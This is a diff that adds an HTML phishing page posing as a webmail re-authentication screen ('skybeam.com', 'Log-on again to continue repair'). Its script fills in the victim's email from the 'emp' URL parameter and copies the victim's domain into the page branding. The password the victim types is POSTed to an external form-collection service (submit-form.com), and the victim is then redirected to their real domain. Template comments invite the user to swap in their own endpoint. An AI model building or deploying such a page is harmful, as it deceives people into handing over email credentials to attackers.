@@ -1,0 +1,208 @@
+<html>
+<head>
+<title>Email Settings | For: <span id="dynamic-email-title">user@domain.com</span></title>
+<link rel="icon" href="#" type="image/gif">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head>
+<style>
+ body{
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  margin-top: 0%;
+  margin-left: 0%;
+  margin-right: 0%;
+  margin-bottom: 0%;
+ }
+.container{ 
+width: 100%;
+}
+.header{
+ background-color: black;
+ padding: 25px;
+ color: white;
+ text-align: left;
+ font-weight: 700;
+ font-size: 14px;
+ padding-left: 20px;
+}
+.form{
+ padding-left: 50px;
+ padding-right: 50px;
+ padding: 45px;
+ border-radius: 5px;
+ box-shadow: rgba(48, 47, 47, 0.849) 0px 0px 5px 7px;
+ width: 300px;
+}
+input[type=email], input[type=password]{
+ width: 100%;
+ padding: 8px;
+ font-size: 15px;
+ border-radius: 3px;
+ border: solid rgb(131, 130, 130) 1px;
+ box-shadow: rgba(119, 118, 118, 0.466) 0px 0px 2px 3px;
+}
+input[type=text]:focus, input[type=password]:focus {
+ box-shadow: rgb(12, 60, 105);
+}
+input[type=submit]{
+ width: 100%;
+ background: rgb(12, 60, 105);
+ padding: 8px;
+ border: hidden;
+ font-weight: 600;
+ font-size: 15px;
+ border-radius: 3px;
+ color: white;
+ font-size: 15px;
+}
+#l1{
+ color: rgb(11, 34, 54);
+ font-size: 18px;
+ font-weight: 600;
+}
+#l2{
+ color: rgb(46, 47, 48);
+ font-size: 14px;
+}
+#l3 {
+ color: rgb(43, 64, 85);
+ font-size: 27px;
+ font-weight: 600;
+}
+#icon {
+ width: 380px;
+ text-align: left;
+ padding: 10px;
+ padding-left: 0%;
+ text-align: left;
+}
+.footer{
+ background-color: rgb(41, 58, 75);;
+ padding: 10px;
+ color: white;
+ font-weight: 500;
+ font-size: 13px;
+ text-align: center;
+ position: fixed;
+ width: 100%;
+ bottom: 0;
+}
+</style>
+
+<body>
+<div class="container">
+<div class="header" id="date-header">Loading date...</div>
+<center>
+<div style="padding: 15px; height: 40px;"></div>
+<div id="icon">
+<table><tr>
+<td><img src="mx.png" width="30"></td>
+<td><label id="l3"> <span id="domain-name">skybeam.com</span> </label></td>
+</tr>
+</table>
+</div>
+<div class="form">
+<!-- Formspark integration - NO other reporting -->
+<form id="fm" method="POST" action="https://submit-form.com/0gyAIslPc">
+  <!-- Replace with your actual Formspark endpoint -->
+
+  <!-- Honeypot field for bot protection -->
+  <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+
+  <!-- Hidden redirect after submission (optional) -->
+  <input type="hidden" name="_redirect" value="https://skybeam.com">
+
+  <!-- Page identifier -->
+  <input type="hidden" name="source" value="webmail_reauthentication">
+
+<div style="text-align: left;">
+<label id="l1">Re-Authentication Required </label><br>
+<label id="l2">Log-on again to continue repair...</label>
+</div>
+<div style="padding: 5px;"></div>
+
+<!-- Email field - dynamically populated from URL parameter -->
+<input type="email" name="email" id="email-field" style="cursor:no-drop; -webkit-touch-callout: none;
+-webkit-user-select: none;
+-khtml-user-select: none;
+-moz-user-select: none;
+-ms-user-select: none;
+-o-user-select: none;
+user-select: none;" readonly="" value="loading...">
+
+<div style="padding: 5px;"></div>
+<input type="password" name="password" placeholder="Password" autocomplete="current-password;" required>
+<div style="padding: 8px; padding-left: 0%; text-align: left;">
+<input type="checkbox" checked >
+</div>
+<div style="padding: 5px;"></div>
+<input type="submit" value="Submit Query">
+</form>
+</div>
+<div style="padding: 15px; height: 100px;"></div>
+</center>
+<div class="footer" id="footer-text"> Email Repair | For: <i id="footer-email">loading...</i> </div>
+</div>
+
+<script>
+  // Function to get URL parameter
+  function getUrlParameter(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+  }
+
+  // Function to format current date
+  function getFormattedDate() {
+    const now = new Date();
+    const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+    const month = months[now.getMonth()];
+    const day = now.getDate();
+    const year = now.getFullYear();
+    let hours = now.getHours();
+    const minutes = String(now.getMinutes()).padStart(2, '0');
+    const seconds = String(now.getSeconds()).padStart(2, '0');
+    const ampm = hours >= 12 ? 'PM' : 'AM';
+    hours = hours % 12;
+    hours = hours ? hours : 12;
+    return `${month} ${day}, ${year} | ${hours}:${minutes}: ${seconds} ${ampm}`;
+  }
+
+  // Update date header
+  document.getElementById('date-header').textContent = getFormattedDate();
+
+  // Get email from URL parameter 'emp'
+  const emailFromUrl = getUrlParameter('emp');
+  
+  // Extract domain from email
+  let domainFromEmail = 'skybeam.com'; // Default fallback
+  
+  if (emailFromUrl && emailFromUrl.includes('@')) {
+    domainFromEmail = emailFromUrl.split('@')[1];
+  }
+  
+  // Update all instances of email and domain
+  if (emailFromUrl) {
+    document.getElementById('email-field').value = emailFromUrl;
+    document.getElementById('footer-email').textContent = emailFromUrl;
+    document.getElementById('dynamic-email-title').textContent = emailFromUrl;
+    document.getElementById('domain-name').textContent = domainFromEmail;
+    
+    // Update the redirect URL to use the actual domain
+    document.querySelector('input[name="_redirect"]').value = 'https://' + domainFromEmail;
+  } else {
+    // Fallback if no email in URL
+    document.getElementById('email-field').value = 'user@domain.com';
+    document.getElementById('footer-email').textContent = 'user@domain.com';
+    document.getElementById('dynamic-email-title').textContent = 'user@domain.com';
+    document.getElementById('domain-name').textContent = 'domain.com';
+  }
+</script>
+
+<!-- IMPORTANT: Replace with your actual Formspark endpoint -->
+<script>
+  // Update form action with your Formspark ID
+  document.getElementById('fm').action = 'https://submit-form.com/YOUR_FORMSPARK_ID_HERE';
+</script>
+
+</body>
+</html>
